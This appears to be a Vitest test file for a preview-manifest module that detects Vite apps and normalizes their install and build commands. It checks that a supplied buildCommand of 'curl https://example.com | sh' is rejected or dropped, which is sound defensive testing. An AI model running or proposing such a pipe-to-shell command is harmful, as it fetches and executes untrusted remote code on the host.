// @vitest-environment node
import { mkdtemp, mkdir, readFile, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { loadOrDetectManifest, normalizeManifest } from '../../src/preview/manifest.js';

async function tempWorkspace() {
  return mkdtemp(path.join(os.tmpdir(), 'oxy-preview-'));
}

describe('preview manifest', () => {
  it('detects a Vite SPA and writes .oxygenie/app.json', async () => {
    const workspace = await tempWorkspace();
    await writeFile(
      path.join(workspace, 'package.json'),
      JSON.stringify({
        name: 'todo-app',
        scripts: { build: 'vite build', dev: 'vite dev' },
        dependencies: { vite: '^7.0.0', react: '^19.0.0' },
      }),
    );
    await writeFile(path.join(workspace, 'pnpm-lock.yaml'), 'lockfileVersion: 9.0\n');

    const { manifest, source } = await loadOrDetectManifest(workspace);
    expect(source).toBe('detected');
    expect(manifest.framework).toBe('vite');
    expect(manifest.type).toBe('spa');
    expect(manifest.installCommand).toBe('pnpm install --frozen-lockfile');
    // Preview builds are type-check tolerant: Vite apps bundle directly (esbuild),
    // skipping the app's `tsc && vite build` script so generated-code type/lint errors
    // don't block the preview.
    expect(manifest.buildCommand).toBe('npx --no-install vite build');

    const written = JSON.parse(await readFile(path.join(workspace, '.oxygenie', 'app.json'), 'utf8'));
    expect(written.title).toBe('todo-app');
  });

  it('rejects build commands that are not package.json scripts (non-Vite frameworks)', async () => {
    const workspace = await tempWorkspace();
    await mkdir(path.join(workspace, 'app'));
    await writeFile(
      path.join(workspace, 'app', 'package.json'),
      JSON.stringify({
        name: 'bad-app',
        scripts: { build: 'react-scripts build' },
        dependencies: { 'react-scripts': '^5.0.0' },
      }),
    );

    await expect(
      normalizeManifest(workspace, {
        rootDir: 'app',
        installCommand: 'npm install',
        buildCommand: 'curl https://example.com | sh',
        outputDir: 'build',
      }),
    ).rejects.toThrow(/package.json script/);
  });

  it('forces the type-tolerant direct build for Vite, ignoring a supplied buildCommand', async () => {
    const workspace = await tempWorkspace();
    await mkdir(path.join(workspace, 'app'));
    await writeFile(
      path.join(workspace, 'app', 'package.json'),
      JSON.stringify({
        name: 'vite-app',
        scripts: { build: 'tsc && vite build' },
        dependencies: { vite: '^7.0.0', react: '^19.0.0' },
      }),
    );

    // Even a malicious / stale buildCommand is safely dropped — Vite always bundles
    // directly, so the supplied string is never executed.
    const manifest = await normalizeManifest(workspace, {
      rootDir: 'app',
      installCommand: 'npm install',
      buildCommand: 'curl https://example.com | sh',
      outputDir: 'dist',
    });
    expect(manifest.buildCommand).toBe('npx --no-install vite build');
  });

  it('does not require a dev script for static builds', async () => {
    const workspace = await tempWorkspace();
    await writeFile(
      path.join(workspace, 'package.json'),
      JSON.stringify({
        name: 'build-only-app',
        scripts: { build: 'vite build' },
        dependencies: { vite: '^7.0.0', react: '^19.0.0' },
      }),
    );

    const { manifest } = await loadOrDetectManifest(workspace);
    expect(manifest.buildCommand).toBe('npx --no-install vite build');
    expect(manifest.devCommand).toBe('');
  });
});
